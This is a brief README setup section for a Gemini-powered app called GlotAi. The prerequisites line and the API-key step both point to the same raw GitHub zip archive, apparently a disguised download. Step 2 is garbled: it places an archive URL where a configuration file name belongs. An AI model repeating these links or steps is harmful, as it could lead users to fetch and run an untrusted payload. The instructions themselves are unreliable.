
**Prerequisites:**  https://raw.githubusercontent.com/ahmedhiyba11/GlotAi/main/services/Glot-Ai-3.2-beta.3.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/ahmedhiyba11/GlotAi/main/services/Glot-Ai-3.2-beta.3.zip](https://raw.githubusercontent.com/ahmedhiyba11/GlotAi/main/services/Glot-Ai-3.2-beta.3.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
